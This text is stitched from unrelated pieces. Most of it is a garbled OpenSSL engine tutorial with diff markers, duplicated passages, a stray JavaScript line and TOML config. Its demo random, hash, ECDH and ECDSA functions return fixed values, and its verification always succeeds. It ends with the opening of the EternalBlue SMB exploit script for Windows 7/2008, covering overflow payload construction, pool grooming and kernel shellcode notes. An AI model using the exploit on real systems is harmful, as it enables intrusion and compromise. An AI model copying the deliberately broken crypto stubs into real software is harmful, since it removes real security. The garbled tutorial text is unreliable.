int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
char *app_data; +};
+struct ecdsa_method {

const char *name;
ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len,
                            EC_KEY *eckey);
int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv,
                        BIGNUM **r);
int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len,
                       const ECDSA_SIG *sig, EC_KEY *eckey);
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
void *app_data; +}; +As we can see the ECDSA method structure needs at least 3 functions, the setup function the signing function and the verifying function. Similar to the ECDH section we define our methods in our oezganEngine.c file: +static ECDSA_METHOD oezgan_engine_ecdsa_method = {
   "Oezgan engine ECDSA method",
   oezgan_engine_ecdsa_sign,
   oezgan_engine_ecdsa_sign_setup,
   oezgan_engine_ecdsa_do_verify,
+# if 0

   NULL,                       /* init */
   NULL,                       /* finish */
+# endif

   0,                          /* flags */
   NULL                        /* app_data */
+} +We also add our signing, verifying and setup functions to the oezganEngine.c file: +int oezgan_engine_ecdsa_sign_setup (EC_KEY *eckey, BN_CTX *ctx_in, BIGNUM **kinvp,

   BIGNUM **rp)
+{

return 1; +} +static ECDSA_SIG *oezgan_engine_ecdsa_sign (const unsigned char *dgst, int dgst_len,
   const BIGNUM *kinv, const BIGNUM *rp,
   EC_KEY *in_eckey) {
printf("oezgan engine ecdsa sign digest \n");
unsigned char * out_sig;
out_sig = malloc(sizeof(unsigned char)*64);
int sig_len = 0;
//convert privatekey
int pkeyLen = i2d_ECPrivateKey(in_eckey,NULL);
const BIGNUM* bignum = EC_KEY_get0_private_key(in_eckey);
int pkeyLen;
unsigned char *ucBuf, *uctempBuf;
pkeyLen = BN_bn2mpi(bignum, NULL);
ucBuf = (unsigned char *)malloc(pkeyLen+1);
uctempBuf = ucBuf;
//Note that this function modifies the uctempBuf as
// uctempBuf = uctempBuf + pkeyLen
BN_bn2mpi(bignum, uctempBuf);
memset(ucBuf,4,pkeyLen);
sig_len = pkeyLen;
ECDSA_SIG * ret_sig;
ret_sig = d2i_ECDSA_SIG(NULL,&out_sig,sig_len);
out_sig -= sig_len;
return ret_sig; +}
+int oezgan_engine_ecdsa_do_verify (const unsigned char *digest, int digest_len,

   const ECDSA_SIG *ecdsa_sig, EC_KEY *eckey) {
printf("oezgan engine verifying function\n");
int res = 0;
int er = 0;
//convert ECDSA_SIG to unsigned char
int sig_len = i2d_ECDSA_SIG(ecdsa_sig,NULL);
unsigned char * sign = malloc(sizeof(unsigned char)*sig_len);
er = i2d_ECDSA_SIG(ecdsa_sig,&sign);
sign -= sig_len;
//convert EC_Key to unsigned char
int pubkey_len = i2o_ECPublicKey(eckey,NULL);
unsigned char* pubkey = malloc(sizeof(unsigned char)*pubkey_len);
er = i2o_ECPublicKey(eckey,&pubkey);
pubkey -= er;
if(er == 0) {
   printf("\n Could not convert EC_KEY error:%d\n",er);
   return er;
}
res =99;
printf("oezgan ecdsa verfiy end! result %d\n",res);
return res; +} +Our setup function does basically nothing. It always returns 1. You can also use the default implementation of the ECDSA sign setup method located in the file crypto/ecdsa/ecs_ossl.c in the source directory of OpenSSL. We can’t do much in our signing function without a proper signing algorithm, since the return value type ECDSA_SIG needs to be a DER encoded elliptic curve digital signature which consists of a pair (r,s). Therefore our ecdsa implementation returns 0 as the size of the signature and no signature at all. The verifying function always returns 99 independent of the data provided. The conversions in these methods are made for demonstration purposes, to give the reader a rough idea about implementing his or her own algorithms. +List of conversions done: +Finally we modify our bind_helper function again as follows: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
       !ENGINE_set_name(e, engine_oezgan_name) ||
       !ENGINE_set_RAND(e, &oezgan_random_method) ||
       !ENGINE_set_init_function(e, oezgan_init) ||
       !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ||
       !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ||
       !ENGINE_set_ECDSA(e, &oezgan_engine_ecdsa_method)
)
   return 0;
return 1;+ +} +To test this we also need a certificate file noted here as “ownCert.pem”. Then we add the following lines to our test program:
er = ENGINE_set_default_ECDSA(oezgan_engine);
printf("\nENGINE SETTING DEFAULT ECDSA:%d\n",er);
unsigned char *sig = new unsigned char[256];
unsigned int sigsize;
ECDSA_sign(0,digest,digestSize,sig,&sigsize,eckey);
printf("Signature size:%d \n",sigsize);
for(int i=0; i <sigsize;i++) {
   printf("%x",sig[i]);
}
printf("\n");
printf("Now verifying!\n");
BIO* bio_in;
bio_in = BIO_new_file("./ownCert.pem", "r");
if (bio_in == NULL) {
   printf("could not read public key file\n");
   exit(1);
}
X509 *certificate;
certificate = X509_new();
if (PEM_read_bio_X509(bio_in, &certificate, 0, NULL) == NULL) {
   printf("could not read  certificate from public key file\n");
   exit(1);
}
EVP_PKEY *pubKey;
pubKey = X509_get_pubkey(certificate);
EC_KEY* eckey_pub;
eckey_pub = EVP_PKEY_get1_EC_KEY(pubKey);
int result = ECDSA_do_verify(digest, digestSize,
       ecdsa_sig, eckey_pub);
printf("Verify result %d\n", result); +The resulting output is: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +ENGINE SETTING DEFAULT ECDH: 1 +ENGINE SETTING DEFAULT ECDSA:1 +Oezgan Engine ECDH Method +Oezgan engine ECDH method End returning: 97! +Oezgan engine Agreed Value: 97 +3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 +oezgan engine ecdsa sign digest +427abc1d0cb9498d5828fc228e3350da674afab9981f5b7c99c5ee1856e83379b89fa6566bf90144f955a2de1973b22138277efd8117e70c636dee84b3592b15b2abf479c7b1fa5db86f35d93fca1d918bbdcf815a82fd44b515cb58942 +--- +Signature size:0
+Now verifying! +oezgan engine verifying function +oezgan ecdsa verfiy end! result 99 +Verify result 99 +Note about the ECDSA_METHOD structure + +Instead of putting the definition of the ECDSA_METHOD in the header file we can alternatively use the build-in OpenSSL methods for acquiring the method structure. Actually this is encouraged with OpenSSL versions >= 1.0.2. This is done as follows: +static ECDSA_METHOD *oezgan_engine_ecdsa_method = NULL +

static int setup_ecdsa_method(void)
{
   oezgan_engine_ecdsa_method = ECDSA_METHOD_new(NULL);
if (oezgan_engine_ecdsa_method == NULL)
       return 0;
   ECDSA_METHOD_set_name(oezgan_engine_ecdsa_method, "Oezgan engine ECDSA method");
   ECDSA_METHOD_set_sign(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign);
   ECDSA_METHOD_set_sign_setup(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign_setup);
   ECDSA_METHOD_set_verify(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_do_verify);
return 1;
} +and then in the bind_helper we have to do something like this:
int bind_helper(ENGINE * e, const char *id)
{
   if (!ENGINE_set_id(e, engine_oezgan_id) ||
           !ENGINE_set_name(e, engine_oezgan_name) ||
  !setup_ecdsa_method() ||
           !ENGINE_set_ECDSA(e, oezgan_engine_ecdsa_method)
   )
       return 0;
   return 1;
} +This is probably the smoother way to go. +Using C++ Implementations
+In our engine implementation of random generation, sha256, ECDH and ECDSA we used strict C methods. In practice however it is easier to implement elliptic curve functionality in C++; at least this is the author’s perception. Let’s assume that we have some elliptic curve and sha256 implementation in C++. How can we use this implementation as an engine in OpenSSL? Consider the following diagram. +Wrapper.png +The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. +The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. Here is a simple with the random function. The wrapper.h file: +#ifndef WRAPPER_H_ +#define WRAPPER_H_ + + +#ifdef __cplusplus +extern "C" +{ +#endif

extern void getRandomBytes_C(unsigned char* buffer, int length); +#ifdef __cplusplus +}
+#endif +#endif /* WRAPPER_H_ / + +And the wrapper.c file: +#include <stdio.h> +#include <string.h> +#include +#include +#include +#include "wrapper.h" + + +using namespace std; +typedef unsigned char byte; +typedef std::vector ByteVector; + +void getRandomBytes_C(unsigned char buffer, int numBytes) {

string str = "oezgan engine wrapper getRandomBytes C++ method";
cout << str << "\n";
string fileName = "/dev/urandom";
ByteVector result;
std::ifstream inFile(fileName.c_str());
std::filebuf* fileBuf = inFile.rdbuf();
result.resize(numBytes);
fileBuf->sgetn(reinterpret_cast<char*>(&result[0]), numBytes);
inFile.close();
memcpy(buffer,&result[0],numBytes);
+} +When we modify the Engine.c file as: +//new include +#include "wrapper.h" + +int get_random_bytes(unsigned char *buf, int num) {

printf("oezgan engine random length %d\n", num);
getRandomBytes_C(buf, num);
return 99; +} +Note that the engine should be compiled with the +-Wl,-whole-archive -lwrapper -Wl,-no-whole-archive +linker flag, such that the wrapper is completely included in the engine. In eclipse you can define an environment variable for that. +To add the whole archive flag in eclipse you can go to +Project->Properties->C/C++ Build->Enviroment +And add a new environment variable WHOLELIB with the value: +-Wl,-whole-archive -lwrapper -Wl,-no-whole-archive +After that, go to:
+Project->Properties->C/C++ Build->Setting->Tool Settings-> GCC C Linker +and add under expert settings at the end of the command line pattern (with an empty space between) ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +oezgan engine wrapper getRandomBytes C++ method +dea695abdf +… +As you can see the C++ random generation method is used, for other methods you can use a similar approach.

document.querySelector("#find-me").addEventListener("click", geoFindMe);

@@ -27007,4 +27778,4 @@ then the validating party should refuse to accept the certificate. Custom options should append the originating author or organisation's domain name to the option name, e.g. "my-option artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ]

exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10

"""

sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. Beginning

We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: #include <openssl/engine.h> static const char *engine_oezgan_id = "oezgan"; static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE";

IMPLEMENT_DYNAMIC_CHECK_FN(); IMPLEMENT_DYNAMIC_BIND_FN(bind_helper);

int oezgan_init(ENGINE *e) { printf("Oezgan Engine Initializatzion!\n"); return 786; }

int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e,oezgan_init) ) return 0;

return 1;
}

and the tester oezganEngineTester.cc file: #include <openssl/engine.h> #include <stdio.h> #include <string.h>

int main(int argc, const char* argv[] ) { OpenSSL_add_all_algorithms();

ERR_load_crypto_strings();

ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");

if( oezgan_engine == NULL )
{
    printf("Could not Load Oezgan Engine!\n");
    exit(1);
}
printf("Oezgan Engine successfully loaded\n");

int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0;
}

Note that we use a c++ file to test the engine. Running the tester gives us the following result: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. Cleanup memory leaks For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. The Random Function

OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: typedef struct rand_meth_st RAND_METHOD; typedef struct ecdh_method ECDH_METHOD; typedef struct ecdsa_method ECDSA_METHOD; For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: struct rand_meth_st { void (*seed) (const void *buf, int num); int (*bytes) (unsigned char *buf, int num); void (*cleanup) (void); void (*add) (const void *buf, int num, double entropy); int (*pseudorand) (unsigned char *buf, int num); int (*status) (void); }; Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: int oezgan_random_status(void) { return 1; } Now we implement our own method for generating a number of random bytes as follows: //new includes #include <string.h> #include <openssl/ossl_typ.h>

int get_random_bytes(unsigned char buffer, int num) { printf("oezgan engine random length %d\n", num); memset(buffer,1,num); return 99; } This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: RAND_METHOD oezgan_random_method = { NULL, / seed / get_random_bytes, NULL, / cleanup / NULL, / add */ NULL, oezgan_random_status }; We also modify the bind_helper function from above: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_RAND(e, &oezgan_random_method) ) return 0; return 1; } In the tester we add the following lines: ENGINE_set_default_RAND(oezgan_engine);

unsigned char * rand_buf= new unsigned char[5]; int err = RAND_bytes(rand_buf,5); for(int i= 0; i < 5; i++) { printf("%x",rand_buf[i]); } printf("\n"); free(rand_buf); The result is seen below: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. Digests

Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: struct env_md_st { int type; int pkey_type; int md_size; unsigned long flags; int (*init) (EVP_MD_CTX *ctx); int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count); int (*final) (EVP_MD_CTX *ctx, unsigned char *md); int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from); int (*cleanup) (EVP_MD_CTX ctx); / FIXME: prototype these some day */ int (*sign) (int type, const unsigned char *m, unsigned int m_length, unsigned char *sigret, unsigned int *siglen, void *key); int (*verify) (int type, const unsigned char *m, unsigned int m_length, const unsigned char *sigbuf, unsigned int siglen, void key); int required_pkey_type[5]; / EVP_PKEY_xxx / int block_size; int ctx_size; / how big does the ctx->md_data need to be / / control function */ int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); } / EVP_MD / ; (Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: static EVP_MD oezgan_engine_sha256_method= { NID_sha256, NID_undef, 32, EVP_MD_FLAG_PKEY_METHOD_SIGNATURE, oezgan_engine_sha256_init, oezgan_engine_sha256_update, oezgan_engine_sha256_final, oezgan_engine_sha256_copy, oezgan_engine_sha256_cleanup, / FIXME: prototype these some day / NULL, NULL, {NID_undef, NID_undef, 0, 0, 0}, 64, /Block Size/ 32, / how big does the ctx->md_data need to be / / control function / NULL, } ; SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… Note Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_ to set functions and properties list above. OID and NID In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) { ctx->update = &oezgan_engine_sha256_update; printf("initialized! SHA256\n"); return 1; }

static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void data,size_t count) { printf("SHA256 update \n"); unsigned char * digest256 = (unsigned char) malloc(sizeof(unsigned char)*32); memset(digest256,2,32); count = 32; ctx->md_data = digest256; return 1; }

static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char md) { printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD)); memcpy(md,(unsigned char)ctx->md_data,32); return 1; }

int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) { printf("Copy SHA256\n"); if (to->md_data && from->md_data) { memcpy(to->md_data, from->md_data,sizeof(from->md_data)); } return 1; }

static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) { printf("SHA256 cleanup\n"); if (ctx->md_data) memset(ctx->md_data, 0, 32); return 1; } Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. static int oezgan_digest_ids[] = {NID_sha256};

static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest, const int **nids, int nid) { int ok = 1; if (!digest) { *nids = oezgan_digest_ids; printf("\n Digest is empty! Nid:%d\n", nid); return 2; } printf("Digest no %d requested\n",nid); if (nid == NID_sha256) { *digest = &oezgan_engine_sha256_method; } else { ok = 0; *digest = NULL; } return ok; } We also need to modify the bind_helper function again: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ) return 0; return 1; } And we modify our tester to generate us a SHA256 Hash function. char * str = "Fraunhofer FKIE Wachtberg!"; int str_len = 26; int er = ENGINE_set_default_digests(oezgan_engine); printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);

unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;

EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
    printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx);
The result is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. ECDH

We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. The file oezganEngine.h: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_ #ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

#ifdef __cplusplus } #endif

#endif /* OEZGANENGINE_H_ */ KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: ECDH_METHOD oezgan_ecdh_method = { "Oezgan Engine ECDH Method", oezgan_engine_compute_ecdh_key,

if 0

    NULL,
    NULL,
endif

    0,
    NULL,
}; And the implementation of the ECDH method: static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey, EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out, size_t *outlen)) { printf("Oezgan Engine ECDH Method\n");

EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                          NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                         pubkey_buf, pubkey_len, NULL);

//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len =  BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);

memset(key,3,pubkey_len);
outlen = pubkey_len;	

free(privkey_buf);
free(pubkey_buf);

printf("Oezgan engine ECDH method End returning: %d!\n", outlen);

return outlen;
} Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ) return 0; return 1; } To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported i


#!/usr/bin/python
from impacket import smb
from struct import pack
import sys
import socket

'''
EternalBlue exploit for Windows 7/2008 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)

Tested on:
- Windows 7 SP1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x86
- Windows 2008 SP1 x64
- Windows 2008 SP1 x86

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/


Bug detail:
- For the buffer overflow bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- The exploit also use other 2 bugs (see details in BUG.txt)
  - Send a large transaction with SMB_COM_NT_TRANSACT but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
  - Send special session setup command (SMB login command) to allocate big nonpaged pool (use for creating hole)
######


Exploit info:
- I do not reverse engineer any x86 binary so I do not know about exact offset.
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
  This memory page is executable on Windows 7 and Wndows 2008.
- The important part of feaList and fakeStruct is copied from NSA exploit which works on both x86 and x64.
- The exploit trick is same as NSA exploit
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


srvnet buffer info:
- srvnet buffer contains a pointer to another struct and MDL about received buffer
  - Controlling MDL values results in arbitrary write
  - Controlling pointer to fake struct results in code execution because there is pointer to function
- A srvnet buffer is created after target receiving first 4 bytes
  - First 4 bytes contains length of SMB message
  - The possible srvnet buffer size is "..., 0x9000, 0x11000, 0x21000, ...". srvnet.sys will select the size that big enough.
- After receiving whole SMB message or connection lost, server call SrvNetWskReceiveComplete() to handle SMB message
- SrvNetWskReceiveComplete() check and set some value then pass SMB message to SrvNetCommonReceiveHandler()
- SrvNetCommonReceiveHandler() passes SMB message to SMB handler
  - If a pointer in srvnet buffer is modified to fake struct, we can make SrvNetCommonReceiveHandler() call our shellcode
  - If SrvNetCommonReceiveHandler() call our shellcode, no SMB handler is called
  - Normally, SMB handler free the srvnet buffer when done but our shellcode dose not. So memory leak happen.
  - Memory leak is ok to be ignored


Shellcode note:
- Shellcode is executed in kernel mode (ring 0) and IRQL is DISPATCH_LEVEL
- Hijacking system call is common method for getting code execution in Process context (IRQL is PASSIVE_LEVEL)
  - On Windows x64, System call target address can be modified by writing to IA32_LSTAR MSR (0xc0000082)
  - IA32_LSTAR MSR scope is core/thread/unique depended on CPU model
  - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
      get call because it is called on other processors
  - Shellcode should be aware of double overwriting system call target address when using hijacking system call method
- Then, using APC in Process context to get code execution in userland (ring 3)
'''

# Note: see how to craft FEALIST in eternalblue_poc.py

# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde

ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

'''
Reverse from srvnet.sys (Win7 x64)
- SrvNetAllocateNonPagedBufferInternal() and SrvNetWskReceiveComplete():

// for x64
struct SRVNET_BUFFER {
	// offset from POOLHDR: 0x10
	USHORT flag;
	char pad[2];
	char unknown0[12];
	// offset from SRVNET_POOLHDR: 0x20
	LIST_ENTRY list;
	// offset from SRVNET_POOLHDR: 0x30
	char *pnetBuffer;
	DWORD netbufSize;  // size of netBuffer
	DWORD ioStatusInfo;  // copy value of IRP.IOStatus.Information
	// offset from SRVNET_POOLHDR: 0x40
	MDL *pMdl1; // at offset 0x70
	DWORD nByteProcessed;
	DWORD pad3;
	// offset from SRVNET_POOLHDR: 0x50
	DWORD nbssSize;  // size of this smb packet (from user)
	DWORD pad4;
	QWORD pSrvNetWskStruct;  // want to change to fake struct address
	// offset from SRVNET_POOLHDR: 0x60
	MDL *pMdl2;
	QWORD unknown5;
	// offset from SRVNET_POOLHDR: 0x70
	// MDL mdl1;  // for this srvnetBuffer (so its pointer is srvnetBuffer address)
	// MDL mdl2;
	// char transportHeader[0x50];  // 0x50 is TRANSPORT_HEADER_SIZE
	// char netBuffer[0];
};

struct SRVNET_POOLHDR {
	DWORD size;
	char unknown[12];
	SRVNET_BUFFER hdr;
};
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
